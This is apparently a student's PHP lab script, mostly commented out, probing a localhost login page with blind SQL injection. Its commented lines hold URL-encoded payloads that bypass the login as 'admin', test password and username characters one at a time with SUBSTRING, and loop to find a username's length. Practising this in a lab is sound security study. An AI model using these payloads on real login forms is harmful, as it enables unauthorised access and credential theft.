<?php
//$url="http://localhost/lab09/login.php?u=\"%20or%20username%20=%20%27admin%27%20--%20";
//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,1,1)%20=%20%27a%27%20--%20"; // Celui fonctionne
//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20"





/*for ($i = 1; $i <= 5; $i++) {
    echo "The number is: $i <br>";
} */

foreach (range('A', 'Z') as $column){
         echo "<td>  $column </td>";
}   

/*Ceci marche
$size = 0;
while ($size < 25)
{
    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$size--%20";
	$result = file_get_contents($url);
	if (strpos($result, 'cat') !== false) {
		echo "\n";
		
		break;
	}else{
		//echo "\n";
		//echo "nope";
	}

	$size++;
}

echo 'size is ';
print $size;

for ($i = 1; $i <= $size; $i++) {
    echo "The number is: $i <br>";
} 
*/









/*$result = file_get_contents($url);

print($result);


if (strpos($result, 'cat') !== false) {
	echo "\n";
	echo 'true';
}else{
	echo "\n";
	echo "nope";
}*/

echo "\n";

?>